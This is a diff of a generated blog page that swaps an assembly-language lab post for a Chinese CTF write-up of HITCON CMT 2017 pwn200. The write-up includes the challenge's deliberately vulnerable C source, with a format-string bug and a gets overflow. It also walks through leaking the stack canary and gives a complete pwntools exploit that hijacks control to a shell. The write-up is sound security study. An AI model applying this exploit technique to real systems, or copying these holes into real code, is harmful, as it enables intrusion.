@@ -77,7 +77,7 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="http://example.com/2025/11/03/“汇编语言王爽（第4版）-实验13”/"/>
+    <link rel="canonical" href="http://example.com/2025/11/20/hitcon2017-pwn200/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
@@ -87,16 +87,16 @@
         
         <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
 <meta property="og:type" content="article">
-<meta property="og:title" content="“汇编语言王爽（第4版）--实验13”">
-<meta property="og:url" content="http://example.com/2025/11/03/%E2%80%9C%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%8E%8B%E7%88%BD%EF%BC%88%E7%AC%AC4%E7%89%88%EF%BC%89-%E5%AE%9E%E9%AA%8C13%E2%80%9D/index.html">
+<meta property="og:title" content="hitcon2017-pwn200">
+<meta property="og:url" content="http://example.com/2025/11/20/hitcon2017-pwn200/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/images/redefine-og.webp">
-<meta property="article:published_time" content="2025-11-03T11:47:15.000Z">
-<meta property="article:modified_time" content="2025-11-09T08:16:39.187Z">
+<meta property="article:published_time" content="2025-11-20T12:23:28.000Z">
+<meta property="article:modified_time" content="2025-11-20T12:40:08.351Z">
 <meta property="article:author" content="John Doe">
-<meta property="article:tag" content="learning-rookie">
+<meta property="article:tag" content="PWN">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/images/redefine-og.webp">
     
@@ -110,7 +110,7 @@
     
     <title>
         
-            “汇编语言王爽（第4版）--实验13” | A1ex&#39;s blogs.
+            hitcon2017-pwn200 | A1ex&#39;s blogs.
         
     </title>
 
@@ -380,7 +380,7 @@
 		<div class="article-title relative w-full">
 			
 			<div class="w-full flex items-center pt-6 justify-start">
-				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">“汇编语言王爽（第4版）--实验13”</h1>
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">hitcon2017-pwn200</h1>
 			</div>
 			
 		</div>
@@ -401,15 +401,15 @@
 					<div class="article-meta-info">
     <span class="article-date article-meta-item">
         <i class="fa-regular fa-pen-fancy"></i>&nbsp;
-        <span class="desktop">2025-11-03 19:47:15</span>
-        <span class="mobile">2025-11-03 19:47:15</span>
+        <span class="desktop">2025-11-20 20:23:28</span>
+        <span class="mobile">2025-11-20 20:23:28</span>
         <span class="hover-info">Created</span>
     </span>
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2025-11-09 16:16:39</span>
-            <span class="mobile">2025-11-09 16:16:39</span>
+            <span class="desktop">2025-11-20 20:40:08</span>
+            <span class="mobile">2025-11-20 20:40:08</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -421,7 +421,7 @@
             <ul>
                 
                     <li>
-                        <a href="/tags/learning-rookie/">learning-rookie</a>&nbsp;
+                        <a href="/tags/PWN/">PWN</a>&nbsp;
                     </li>
                 
             </ul>
@@ -447,26 +447,22 @@
 
 
 		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
-			<p>该实验为编写并安装int 7ch中断例程，显示一个用0结束的字符串，并将中断例程安装到0:200处</p>
-<p>测试程序t1.asm用于触发7ch中断</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line"></span><br><span class="line">data segment</span><br><span class="line">  db &quot;welcome to masm! &quot;,0</span><br><span class="line">data ends</span><br><span class="line"></span><br><span class="line">code segment</span><br><span class="line">  start: mov dh,10</span><br><span class="line">  mov dl,10</span><br><span class="line">  mov cl,2</span><br><span class="line">  mov ax,data</span><br><span class="line">  mov ds,ax</span><br><span class="line">  mov si,0</span><br><span class="line">  int 7ch</span><br><span class="line">  mov ax,4c00h</span><br><span class="line">  int 21h</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure></div>
+			<h1 id="HITCON-CMT-2017-pwn200"><a href="#HITCON-CMT-2017-pwn200" class="headerlink" title="HITCON CMT 2017: pwn200"></a>HITCON CMT 2017: pwn200</h1><p>本题目主要是结合格式化字符串泄漏canary，然后再利用栈溢出导致任意函数执行。相对简单，因为题目给了system，而不用自己再去找libc。</p>
+<h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><p>题目源码：</p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">canary_protect_me</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">        setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">        setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">        <span class="type">char</span> buf[<span class="number">40</span>];</span><br><span class="line">        gets(buf);</span><br><span class="line">        <span class="built_in">printf</span>(buf);           			<span class="comment">// format string</span></span><br><span class="line">        gets(buf);                      <span class="comment">// buf overflow</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
 
-<p>我们分析一下安装 int 7ch的主要步骤</p>
-<ol>
-<li>编写中断例程处理代码</li>
-<li>拷贝整个处理代码到0:200h</li>
-<li>覆盖7ch的地址，使之指向0:200h</li>
-</ol>
-<p>由此，可以得到一下代码</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">start:</span><br><span class="line"></span><br><span class="line">  ;复制中断列程处理代码</span><br><span class="line">  mov ax,cs</span><br><span class="line">  mov ds,ax</span><br><span class="line">  mov si,offset do0</span><br><span class="line">  mov ax,0</span><br><span class="line">  mov es,ax</span><br><span class="line">  mov di,200h</span><br><span class="line">  mov cx,offset do0End - offset do0</span><br><span class="line">  cld</span><br><span class="line">  rep movsb</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  ;修改中断向量表</span><br><span class="line"></span><br><span class="line">  mov ax,0</span><br><span class="line">  mov es,ax</span><br><span class="line">  mov word ptr es:[7ch*4],200h</span><br><span class="line">  mov word ptr es:[7ch*4+2],0  </span><br><span class="line">  mov ax, 4c00h ;复制完成后就退出</span><br><span class="line">  int 21h</span><br><span class="line"></span><br><span class="line">  ;实现输出显示在屏幕</span><br><span class="line"></span><br><span class="line">do0:</span><br><span class="line"> </span><br><span class="line">  mov bl,cl</span><br><span class="line">  mov ax,0b800h</span><br><span class="line">  mov es,ax</span><br><span class="line">  mov di,10*160+36*10 ;屏幕中间显示</span><br><span class="line">  mov cx,17</span><br><span class="line">  s: mov al,[si]  ;循环从ds中提取数据写入缓冲区</span><br><span class="line">  mov ah,bl</span><br><span class="line">  mov es:[di],ax</span><br><span class="line">  inc si</span><br><span class="line">  add di,2</span><br><span class="line">  loop s</span><br><span class="line"></span><br><span class="line">  iret</span><br><span class="line"></span><br><span class="line">do0end:</span><br><span class="line">  nop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure></div>
+<p>将题目编译成NX+ canary+relro开启状态，以及32位</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -fstack-protector -no-pie -z lazy -Wno-implicit-funcion-declaration pwn200.c -o pwn200</span><br></pre></td></tr></table></figure></div>
 
-<p>最终呈现效果：</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/../../../images/blogImage/shiyan13.png"
-                      alt="img" title="实验13-结果"
-                ></p>
+<p>老规矩首先看看文件属性：pwn checksec pwn200。可以看到开启了上述属性</p>
+<p>通过阅读源代码，我们可以看出存在格式化字符串的问题，以及栈溢出。但是由于开启了canary，我们需要确定它的值。</p>
+<p>我们可以选择直接break 在main函数，这样能够看到main 函数的canary装入 gs:0x14 并放在ebp-0xc的位置（这里每个机器都不一样，需要按照自己实际的来）</p>
+<p>我们再下个断点在printf函数，输入aaaa后，查看堆栈，发现aaaa在第6个参数（0开始）上，而同时查看canary的位置，x $ebp-0xc，发现在第15的位置。</p>
+<p>我们直接使用格式化字符串打印它的值：%15$x.</p>
+<p>那么接下来就是找到canary_protect_me函数的位置，在程序中：p canary_protect_me，得到位置</p>
+<p>计算填充：输入的位置-canary &#x3D; 40个字节&#x3D;0x28 canary覆盖到ebp &#x3D; 0xC，最后将函数地址放在ebp+4上</p>
+<p>完整的payload：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io = process(&quot;./pwn200&quot;)</span><br><span class="line">io.sendline(&quot;%15$x&quot;)</span><br><span class="line">canary = int(io.recv(),16)</span><br><span class="line"></span><br><span class="line">sys = 0x80491a6</span><br><span class="line">payload = b&quot;A&quot; * 0x28 + p32(canary) + b&quot;b&quot;* 0xC + p32(sys)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>
 
 		</div>
 
@@ -474,18 +470,18 @@
 		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
 			<div class="article-copyright-info-container">
     <ul>
-        <li><strong>Title:</strong> “汇编语言王爽（第4版）--实验13”</li>
+        <li><strong>Title:</strong> hitcon2017-pwn200</li>
         <li><strong>Author:</strong> A1ex</li>
         <li><strong>Created at
-                :</strong> 2025-11-03 19:47:15</li>
+                :</strong> 2025-11-20 20:23:28</li>
         
             <li>
                 <strong>Updated at
-                    :</strong> 2025-11-09 16:16:39
+                    :</strong> 2025-11-20 20:40:08
             </li>
         
         <li>
-            <strong>Link:</strong> https://havenoideal123.github.io/2025/11/03/“汇编语言王爽（第4版）-实验13”/
+            <strong>Link:</strong> https://havenoideal123.github.io/2025/11/20/hitcon2017-pwn200/
         </li>
         <li>
             <strong>
@@ -507,7 +503,7 @@
 		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
 			
 			<li class="tag-item mx-0.5">
-				<a href="/tags/learning-rookie/">#learning-rookie</a>&nbsp;
+				<a href="/tags/PWN/">#PWN</a>&nbsp;
 			</li>
 			
 		</ul>
@@ -518,23 +514,11 @@
 		
 		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
 			
-			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-				<a class="prev" rel="prev" href="/2025/11/06/%E5%B0%8F%E5%9E%8B%E5%86%85%E6%A0%B8%E5%8A%A0%E8%BD%BD%E7%A8%8B%E5%BA%8F-md/">
-					<span class="left arrow-icon flex justify-center items-center">
-						<i class="fa-solid fa-chevron-left"></i>
-					</span>
-					<span class="title flex justify-center items-center">
-						<span class="post-nav-title-item truncate max-w-48">小型内核加载程序.md</span>
-						<span class="post-nav-item">Prev posts</span>
-					</span>
-				</a>
-			</div>
-			
 			
 			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-				<a class="next" rel="next" href="/2025/10/30/helloworld-md/">
+				<a class="next" rel="next" href="/2025/11/18/NJCTF2017-messager-wp/">
 					<span class="title flex justify-center items-center">
-						<span class="post-nav-title-item truncate max-w-48">helloworld.md</span>
+						<span class="post-nav-title-item truncate max-w-48">NJCTF2017-messager-wp</span>
 						<span class="post-nav-item">Next posts</span>
 					</span>
 					<span class="right arrow-icon flex justify-center items-center">
@@ -609,8 +593,8 @@
 		<div class="post-toc-wrap">
 	<div class="post-toc">
 		<div class="toc-title">On this page</div>
-		<div class="page-title">“汇编语言王爽（第4版）--实验13”</div>
-		
+		<div class="page-title">hitcon2017-pwn200</div>
+		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#HITCON-CMT-2017-pwn200"><span class="nav-text">HITCON CMT 2017: pwn200</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#wp"><span class="nav-text">wp</span></a></li></ol></li></ol>
 
 	</div>
 </div>
